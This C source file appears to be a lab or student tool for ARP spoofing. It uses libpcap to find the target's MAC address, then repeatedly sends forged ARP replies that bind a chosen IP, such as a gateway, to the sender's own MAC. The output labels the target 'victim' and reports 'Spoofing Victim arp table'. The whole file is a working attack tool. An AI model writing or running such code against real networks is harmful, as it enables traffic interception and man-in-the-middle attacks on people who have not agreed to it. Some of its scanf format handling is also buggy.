#include <QCoreApplication>
#include <stdint.h>
#include <stdio.h>
#include <pcap.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>


typedef struct ETHheader {
    uint8_t destMac[6];
    uint8_t srcMac[6];
    uint16_t type;
} eth_header;

typedef struct arp {
    uint16_t hardware_type;
    uint16_t protocol_type;

    uint8_t hardware_addr_len;
    uint8_t protocol_addr_len;

    uint16_t operation;

    uint8_t Sender_Mac[6];
    uint8_t Sender_Ip[4];

    uint8_t Target_Mac[6];
    uint8_t Target_Ip[4];
} arp_header;

void get_MAC(uint8_t *mac) {
    scanf("%02x:%02x:%02x:%02x:%02x:%02x", mac, mac+1, mac+2, mac+3, mac+4, mac+5);
}

void get_my_MAC(uint8_t *mac){
    struct ifreq ifr;
    struct ifconf ifc;
    char buf[1024];
    int success = 0;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) { /* handle error*/ };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

    for (; it != end; ++it) {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else { /* handle error */ }
    }

    if (success) memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

}


void get_IP(uint8_t *ip) {
    scanf("%u.%u.%u.%u",ip, ip+1, ip+2, ip+3);
}

int isPacketMine(const u_char* packet, uint8_t *MAC){
    uint8_t destmac[6];
    memcpy(destmac, packet, 6);

    if(memcmp(destmac,MAC,6)==0) return 1;

    return 0;
}


int main(int argc, char **argv) {

    pcap_t *fp=0;
    pcap_if_t *alldevs;
    eth_header eth;
    arp_header arp;
    unsigned int optype = 0;

    int length = 0, no=0;
    int i=0;
    uint8_t myIP[4];
    uint8_t myMAC[6];
    uint8_t victimMAC[6];
    uint8_t packet[1500];
    char errbuf[PCAP_ERRBUF_SIZE];
    struct pcap_pkthdr* header;
    const u_char* pack;


    if ((fp = pcap_open_live(argv[1], 65535, 0, 1000, errbuf)) == NULL) {
        fprintf(stderr, "unable to open adapter\n", errbuf);
        exit(1);
    }

    memset(packet, 0, sizeof(packet));




    int status = pcap_findalldevs(&alldevs, errbuf);

    if(status != 0)
    {
        printf("%s\n", errbuf);
    }

    for(pcap_if_t *d=alldevs; d!=NULL; d=d->next)
    {
        printf("comp : %s %s\n",d->name, argv[1]);
        if(strcmp(d->name, argv[1]) == 0){
          /*  for(pcap_addr_t *a=d->addresses; a!=NULL; a=a->next)
            {



                    if(a->addr->sa_family == AF_INET)
                    {
                        printf("1234");
                        i=1;
                        printf("%s\n",inet_ntoa((reinterpret_cast<struct sockaddr_in*>(a->addr))->sin_addr));

                    }
                    break;

                }*/
            for(pcap_addr_t *a=d->addresses; a!=NULL; a=a->next)
             {
                    if(a->addr->sa_family == AF_INET)
                    {
                        sscanf(inet_ntoa((reinterpret_cast<struct sockaddr_in*>(a->addr))->sin_addr),"%u.%u.%u.%u",&myIP[0],&myIP[1],&myIP[2],&myIP[3]);
                    }
             }
            break;
        }
    }
    pcap_freealldevs(alldevs);

    get_my_MAC(myMAC);

    printf("myIP : ");
    for(int j = 0 ; j < 4 ; j++){
        printf("%u ", myIP[j]);
    }
    printf("\n");
    memcpy(eth.srcMac, myMAC, 6);
    memcpy(eth.destMac, "\xFF\xFF\xFF\xFF\xFF\xFF",6);
    eth.type = htons(0x0806);	//arp

    arp.hardware_type = htons(1);
    arp.protocol_type = htons(0x0800);
    arp.hardware_addr_len = 6;
    arp.protocol_addr_len = 4;


    arp.operation=htons(1);

    memcpy(arp.Sender_Mac, myMAC,6);
    memcpy(arp.Target_Mac, "\x00\x00\x00\x00\x00\x00",6);


    memcpy(arp.Sender_Ip, myIP, 4);

    sscanf(argv[3],"%u.%u.%u.%u",&arp.Target_Ip[0],&arp.Target_Ip[1],&arp.Target_Ip[2],&arp.Target_Ip[3]);

    memcpy(packet, &eth, sizeof(eth));
    length += sizeof(eth);

    memcpy(packet + length, &arp, sizeof(arp));
    length += sizeof(arp);



    if ((pcap_sendpacket(fp, packet, length)) != 0) {
        fprintf(stderr, "\nError sending packet\n", pcap_geterr(fp));
    }else{
        printf("Getting Victim MAC\n");
    }
    memset(packet, 0, sizeof(packet));
    length=0;
    while(true){
        int res = pcap_next_ex(fp, &header, &pack);
        if(res == 0)continue;
        if (res == -1 || res == -2) break;
        if(isPacketMine(pack,myMAC) == 1){

            if(pack[12] == 0x08 && pack[13] == 0x06){
                if(pack[20] == 0x00 && pack[21] ==0x02){
                    memcpy(victimMAC, pack+22,6);
                    break;
                }

            }
        }
    }
    printf("my MAC: ");
    for(int j = 0 ; j < 6 ; j++){
        printf("%02x ",myMAC[j]);
    }
    printf("\n");
    printf("victim MAC: ");
    for(int j = 0 ; j < 6 ; j++){
        printf("%02x ",victimMAC[j]);
    }
    printf("\n");

    memcpy(eth.srcMac, myMAC, 6);
    memcpy(eth.destMac, victimMAC,6);
    eth.type = htons(0x0806);	//arp

    arp.hardware_type = htons(1);
    arp.protocol_type = htons(0x0800);
    arp.hardware_addr_len = 6;
    arp.protocol_addr_len = 4;
    arp.operation=htons(2);

    memcpy(arp.Sender_Mac, myMAC,6);
    memcpy(arp.Target_Mac, victimMAC, 6);

    sscanf(argv[2],"%u.%u.%u.%u",&arp.Sender_Ip[0],&arp.Sender_Ip[1],&arp.Sender_Ip[2],&arp.Sender_Ip[3]);
    sscanf(argv[3],"%u.%u.%u.%u",&arp.Target_Ip[0],&arp.Target_Ip[1],&arp.Target_Ip[2],&arp.Target_Ip[3]);
    memcpy(packet, &eth, sizeof(eth));
    length += sizeof(eth);
    memcpy(packet+length, &arp, sizeof(arp));
    length += sizeof(arp);

    for(int j = 0 ; j < length ; j++){
        printf("%02X ", packet[j]);

    }
    printf("\n");
    for(int j = 0 ; j < 100; j++){
        sleep(1);
        if ((pcap_sendpacket(fp, packet, length)) != 0) {
            fprintf(stderr, "\nError sending packet\n", pcap_geterr(fp));
        }else{
            printf("Spoofing Victim arp table\n");
        }
    }

    printf("Done");
    return 0;
}
